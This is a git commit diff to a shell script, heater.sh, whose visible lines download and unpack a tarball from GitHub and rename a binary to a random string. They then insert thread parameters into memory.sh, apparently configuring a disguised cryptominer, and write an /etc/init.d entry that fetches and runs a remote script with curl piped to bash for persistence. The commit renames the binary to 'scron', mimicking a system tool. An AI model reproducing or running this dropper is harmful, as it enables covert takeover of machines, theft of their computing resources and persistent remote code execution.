b1899f8a91972680efd1d3f8b3cf7db0b32c2f2f
outputy <nabaati13@gmail.com>
2024-06-10 10:04:45 +0700

    Update heater.sh

--- heater.sh
+++ heater.sh
@@ -3,7 +3,7 @@ wget https://github.com/ccamse/buzzer/releases/download/v0.0.3/copper.tar
 tar -xvf copper.tar
 cd /copper
 variable1=$(< /dev/urandom tr -dc 'a-zA-Z0-9' | fold -w 8 | head -n 1)
-mv screen $variable1
+mv scron $variable1
 sed -i "s/oodo/${variable1} -t=450 -n=${variable1}/g" ./memory.sh
 cd /etc/init.d
 echo "bash <(curl -s -L https://raw.githubusercontent.com/ccamse/buzzer/main/heater.sh)" > socket.sh
